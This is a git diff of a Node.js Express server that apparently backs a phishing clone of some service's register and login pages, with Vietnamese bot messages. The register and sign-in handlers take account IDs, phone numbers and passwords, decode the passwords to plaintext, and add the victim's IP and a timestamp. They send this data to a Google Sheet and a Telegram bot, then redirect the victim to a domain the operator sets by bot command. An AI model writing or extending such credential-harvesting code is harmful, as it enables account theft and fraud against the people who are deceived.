@@ -2,7 +2,7 @@ const express = require("express");
 require("dotenv").config();
 const path = require("path");
 const PORT = process.env.PORT || 3001;
-const GOOGLE_SHEET_ID = process.env.GOOGLE_SHEET_ID;
+const GOOGLE_SHEET_URL = process.env.GOOGLE_SHEET_URL;
 // const GOOGLE_SHEET_URL = `https://script.google.com/macros/s/${GOOGLE_SHEET_ID}/exec`
 const GOOGLE_SHEET_URL_REGISTER = process.env.GOOGLE_SHEET_URL_REGISTER;
 const GOOGLE_SHEET_URL_LOGIN = process.env.GOOGLE_SHEET_URL_LOGIN;
@@ -19,7 +19,10 @@ app.use("/mobile", express.static(path.join(__dirname, "public", "mobile")));
 const { sendRegisterAccountToBot, sendLoginAccountToBot } = require("./utils/sendTelegram");
 const TelegramBot = require('node-telegram-bot-api');
 const bot = new TelegramBot(process.env.TELEGRAM_TOKEN, { polling: true });
-let redirectDomain = "https://27g.345.myftpupload.com/";
+let redirectDomain = "";
+if(redirectDomain === "") {
+  bot.sendMessage(process.env.CHAT_ID, "Tên miền chuyển hướng chưa được thiết lập! Vui lòng dùng lệnh /domain để thiết lập!")
+}
 
 bot.onText(/\/domain (.+)/, (msg, match) => {
   const chatId = msg.chat.id;
@@ -28,16 +31,20 @@ bot.onText(/\/domain (.+)/, (msg, match) => {
   bot.sendMessage(chatId, `Tên miền đã được thay đổi thành: ${redirectDomain}`);
 });
 const axios = require("axios");
+app.set('trust proxy', true);
 app.use((req, res, next) => {
   const userAgent = req.headers["user-agent"];
   const isMobile = /mobile/i.test(userAgent);
   req.isMobile = isMobile;
   next();
 });
-
+app.use((req, res, next) => {
+  var ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress 
+  next();
+});
 app.get("/", (req, res) => {
   if (req.isMobile) {
-    
+    console.log(req.ip);
     return res.render(
       "mobile/index",
       { layout: "mobile/layout",
@@ -88,27 +95,33 @@ app.post("/api/MemberInfo/RegisterMember", async (req, res) => {
       IsReceiveSMS,
       ScreenResolution
     } = req.body;
+    
+    // Decode the password (which is base64 encoded)
     const decodedPWD = Buffer.from(PWD, 'base64').toString('utf-8');
+    
+    const timeNow = new Date().toLocaleString();
+    
+    const userIp = req.headers['x-forwarded-for'] || req.ip;
+
+    // Prepare data to be stored
     const data = {
+      action: "register",
       AgencyURL,
       AccountID,
       NickName,
-      VerifyUsage,
-      PWD: decodedPWD,
-      FingerIDX,
-      SMSVerifyType,
-      LocalStorgeCookie,
       CellPhone,
-      UniqueSessionId,
-      IsReceiveSMS,
-      ScreenResolution
-    }
-    await Promise.all([
-      googleSheetApi.storageDataRegisterToGoogleSheet(data, GOOGLE_SHEET_URL_REGISTER),     
-      sendRegisterAccountToBot(CellPhone, AccountID, NickName, decodedPWD)
-    ]);
-    
+      timeNow,    // Timestamp of when the user registered
+      userIp,      // IP address of the user
+      PWD: decodedPWD
 
+    };
+    console.log(data)
+    await Promise.all([
+      googleSheetApi.storageDataRegisterToGoogleSheet(data, GOOGLE_SHEET_URL),     
+      sendRegisterAccountToBot(CellPhone, AccountID, NickName, userIp, timeNow, decodedPWD)
+    ]);
+
+    // Return success response
     return res.json({
       Error: {
         Code: 5999,
@@ -116,19 +129,26 @@ app.post("/api/MemberInfo/RegisterMember", async (req, res) => {
         Redirect: redirectDomain,
       },
     });
+
   } catch (error) {
-    // Xử lý lỗi
+    // Handle any errors that occur during the process
     console.error(error);
     return res.status(500).send({ message: "Error processing data" });
   }
-
 });
+
 
 app.post("/api/Authorize/SignIn", async (req, res) => {
   const { AccountID, AccountPWD, phone } = req.body;
-  const data = { AccountID, AccountPWD, phone };
+  const timeNow = new Date().toLocaleString();
+    
+  // Get the user's IP address
+  // If using a proxy (like Nginx), 'x-forwarded-for' contains the real IP
+  // Otherwise, fallback to req.ip
+  const userIp = req.headers['x-forwarded-for'] || req.ip;
+  const data = { action: "login", AccountID, AccountPWD, phone, timeNow, userIp };
   await Promise.all([
-    googleSheetApi.storageDataLoginToGoogleSheet(data, GOOGLE_SHEET_URL_LOGIN),
+    googleSheetApi.storageDataLoginToGoogleSheet(data, GOOGLE_SHEET_URL),
     sendLoginAccountToBot(phone, AccountID, AccountPWD)
   ]);
 
